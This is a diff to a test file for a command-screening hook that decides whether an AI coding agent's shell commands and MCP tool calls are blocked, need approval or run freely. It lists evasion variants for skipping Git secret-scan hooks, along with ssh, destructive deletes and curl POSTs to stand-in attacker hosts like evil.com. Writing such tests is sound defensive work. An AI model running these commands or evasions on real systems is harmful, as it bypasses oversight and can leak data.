@@ -55,6 +55,13 @@ const cases = [
     'cmd /c ssh host', '& ssh host', 'ssh.exe host', 'env ssh host', 'FOO=1 ssh host', 'command ssh host', 'nohup ssh host', 'time ssh host', 'timeout 5 ssh host', '/usr/bin/ssh host',
     'echo $(ssh host rm)', 'x=$(ssh host rm)', '(ssh host)', 'if true; then ssh host; fi', 'for h in a; do ssh $h; done', 'Start-Process ssh',
     "& 'C:\\Windows\\System32\\OpenSSH\\ssh.exe' host", "node -e \"require('child_process').execSync('ssh host')\""),
+  // skipping Git hooks turns off the secret scan
+  ...sh(D, 'git commit --no-verify -m "x"', 'git commit -n -m "x"', 'git commit -anm "x"', 'git push --no-verify', 'git -c core.hooksPath=/dev/null commit -m "x"',
+    'git -c "core.hooksPath=x" commit', 'git config core.hooksPath .husky', 'git config --global --unset core.hooksPath', 'bash -c "git commit --no-verify"',
+    'git commit --no-verif -m x', 'GIT_CONFIG_GLOBAL=/dev/null git commit -m x', 'GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.hooksPath GIT_CONFIG_VALUE_0=/x git commit',
+    "git -c alias.c='commit -n' c", 'git -c alias.c=commit\\ -n c', "git config alias.c 'commit -n'", 'git config alias.ci "commit --no-verify"'),
+  ...sh(N, 'git commit -m "add -n and --no-verify to the docs"', 'git commit --amend --no-edit', 'git config --get core.hooksPath', 'git config core.hooksPath', 'git log -n 5',
+    "git config alias.st 'status -sb'", 'git commit --no-verbose -m x'),
   // MCP hard stops, by tool name
   ...['mcp_hostinger_execute', 'mcp_hostinger-mcp_multi-execute', 'mcp_hostinger_execute_site_tool', 'mcp_atlassian-mcp_executeDestructive', 'mcp__claude_ai_Atlassian_MCP__executeDestructive'].map((t) => [D, t, {}]),
   ...sh(N, 'npm test', 'git status', 'git commit -m "docs: explain docker compose down -v and ssh"', 'docker compose -p app_test up -d', 'docker compose --env-file local.env up -d',
@@ -90,21 +97,25 @@ const cases = [
   ...on(N, 'apply_patch', patch('*** Update File: src/a.py\n@@\n-a\n+b'), patch('*** Delete File: src/old.py')),
   [/outside the workspace/, 'apply_patch', patch(`*** Delete File: ${join(homedir(), 'zz-outside.txt')}`)],
 
-  // asks: pushes, Git that loses uncommitted work, wide or outside deletes, cloud CLIs, gh merges and deletes, HTTP that sends
-  // data off this machine, publishing, loaders, deleting MCP tools, Hostinger changes
+  // run by the user only: cloud CLIs, gh merges, deletes and releases, publishing, loaders, Hostinger changes
+  ...sh(D, 'az group list', 'kubectl get pods', 'helm list', 'terraform plan', 'gh pr merge 12', 'gh repo delete o/r --yes', 'gh release create v1', 'gh api -X DELETE repos/o/r/labels/x',
+    'npm publish', 'twine upload dist/*', 'docker push img', 'python Shop/code/local/run_notebook.py', "node -e \"require('child_process').execSync('npm publish')\"", 'cd x && az login'),
+  ...['mcp__hostinger-dns__updateRecord', 'mcp_hostinger_vps_restart'].map((t) => [D, t, {}]),
+  ...sh(N, 'echo "npm publish"', 'grep -rn run_notebook.py docs/', 'git add local/run_notebook.py', 'npm run build'),
+
+  // asks, only what is rare and cannot be undone: Git that loses uncommitted work, wide or outside deletes, deleting and
+  // sending MCP tools
   ...sh(A, 'rm -rf build', 'rm -rf Shop/code', 'Remove-Item -Recurse -Force .\\Shop', 'rm -rf .git/refs', 'rm *', 'rm -r src/*', 'Remove-Item $dir -Recurse', 'Remove-Item',
     'rm C:/Users/x/notes.txt', 'rm "C:/Users/x/my notes.txt"', 'Remove-Item -Recurse "Shop"', 'cmd /c del ..\\..\\a.txt', 'node -e "fs.rmSync(\'x\')"',
     'Get-ChildItem | ForEach-Object { Remove-Item $_ }', "find . -name '*.tmp' -delete",
-    'git push', 'git push origin feature/x', 'git -C Shop/code push', 'git push origin main', 'git reset --hard HEAD~1', 'git clean -fd', 'git restore src/a.py', 'git checkout -- a.py',
-    'git checkout .', 'git checkout -f main', 'git reset --keep HEAD~1', 'powershell -c "git push"', 'pwsh -NoProfile -Comm "git push"', 'git stash drop', 'git log $(git push)', 'git -P push',
-    'git --paginate push', 'git --no-optional-locks push', 'env git push', 'GIT_TRACE=1 git push origin main', 'env -u X git reset --hard', 'git -c alias.p=push p -f',
-    'python -c "import subprocess; subprocess.run(\'git push\', shell=True)"',
-    'az group list', 'kubectl get pods', 'helm list', 'terraform plan', 'gh pr merge 12', 'gh repo delete o/r --yes', 'gh release create v1', 'gh api -X DELETE repos/o/r/labels/x',
-    'curl -X POST https://x', 'curl -d @f https://x', 'Invoke-RestMethod -Method Post https://x', 'iwr https://x -Headers @{Authorization="t"}', 'curl -X POST http://localhost.evil.com/x',
-    'curl -X POST http://localhost:8000@evil.com/', 'npm publish', 'twine upload dist/*', 'docker push img', 'python Shop/code/local/run_notebook.py',
-    "node -e \"require('child_process').execSync('npm publish')\""),
-  ...['mcp_mlflow_mcp_delete_run', 'mcp_atlassian-mcp_deleteConfluencePage', 'mcp__hostinger-dns__updateRecord', 'mcp_hostinger_vps_restart',
-    'mcp__claude_ai_Gmail__trash_thread', 'mcp_gmail_forward_message', 'mcp__gmail__send_email', 'mcp_slack_sendMessage'].map((t) => [A, t, {}]),
+    'git reset --hard HEAD~1', 'git clean -fd', 'git restore src/a.py', 'git checkout -- a.py', 'git checkout .', 'git checkout -f main', 'git reset --keep HEAD~1', 'git stash drop',
+    'powershell -c "git reset --hard"', 'pwsh -NoProfile -Comm "git clean -fd"', 'git log $(git reset --hard)', 'env -u X git reset --hard', 'git -c alias.p=push p -f',
+    'python -c "import subprocess; subprocess.run(\'git reset --hard\', shell=True)"'),
+  ...['mcp_mlflow_mcp_delete_run', 'mcp_atlassian-mcp_deleteConfluencePage', 'mcp__claude_ai_Gmail__trash_thread', 'mcp_gmail_forward_message', 'mcp__gmail__send_email',
+    'mcp_slack_sendMessage'].map((t) => [A, t, {}]),
+  // these run now: pushes (force-push stays a hard stop) and HTTP calls
+  ...sh(N, 'git push', 'git push origin feature/x', 'git -C Shop/code push', 'git push origin main', 'powershell -c "git push"', 'GIT_TRACE=1 git push origin main',
+    'curl -X POST https://x', 'curl -d @f https://x', 'Invoke-RestMethod -Method Post https://x'),
   ...sh(N, 'node --test', 'pytest', 'pnpm test', 'git status --short', 'git -C Shop/code diff', 'git log -n 5', 'grep -rn "rm -rf" src/', 'echo "git push"', 'git commit -m "x"',
     '& git checkout -b x', 'git switch main', 'git stash', 'git stash pop', 'git fetch', 'git pull --ff-only', 'git merge feature/x', 'git branch -d x', 'git restore --staged a.py',
     'git config user.name', 'git config --get user.email', 'git worktree add .worktrees/x -b x', 'git commit --amend --no-edit', 'git rebase main', 'git branch -D x', 'git tag -d v1',
@@ -145,7 +156,7 @@ const cases = [
   // the reason names the rule
   ...sh(/force-push is a hard stop/, '& git push -f', 'powershell -Command "git push --force"', 'bash -c "git push --force"'),
   ...sh(/SSH to a server is a hard stop/, 'cd x & ssh user@host'),
-  ...sh(/git push requires approval/, 'command git push origin x'),
+  ...sh(/git reset can discard uncommitted work/, 'command git reset --hard'),
   ...sh(/deleting a whole project, repo or the workspace/, 'echo a & rm -rf x'),
   [/^Blocked: this MCP tool is a hard stop/, 'mcp__atlassian__executeDestructive', {}],
 ];
@@ -175,7 +186,7 @@ test('Claude Code hook: deny exits 2, ask is JSON, a safe call prints nothing; i
   const deny = run('claude', bashCall('git push --force'));
   assert.equal(deny.status, 2);
   assert.match(deny.stderr.toString(), /force-push is a hard stop/);
-  const ask = run('claude', bashCall('git push'));
+  const ask = run('claude', bashCall('git reset --hard'));
   assert.equal(ask.status, 0);
   assert.equal(JSON.parse(ask.stdout).hookSpecificOutput.permissionDecision, 'ask');
   assert.equal(run('claude', bashCall('npm test')).stdout.toString(), '');
@@ -202,9 +213,9 @@ test('Copilot hook: the decision top-level (Copilot CLI) and in hookSpecificOutp
   assert.equal(deny.hookSpecificOutput.permissionDecision, 'deny');
   assert.equal(deny.hookSpecificOutput.hookEventName, 'PreToolUse');
   // VS Code agent mode sends Claude's field names
-  const ask = out({ hook_event_name: 'PreToolUse', tool_name: 'run_in_terminal', tool_input: { command: 'git push origin x' }, cwd: dir });
+  const ask = out({ hook_event_name: 'PreToolUse', tool_name: 'run_in_terminal', tool_input: { command: 'git clean -fd' }, cwd: dir });
   assert.equal(ask.hookSpecificOutput.permissionDecision, 'ask');
-  assert.match(ask.hookSpecificOutput.permissionDecisionReason, /git push requires approval/);
+  assert.match(ask.hookSpecificOutput.permissionDecisionReason, /git clean can discard uncommitted work/);
   assert.deepEqual(out({ toolName: 'view', toolArgs: JSON.stringify({ path: 'src/app.py' }), cwd: dir }), {});
 });
 
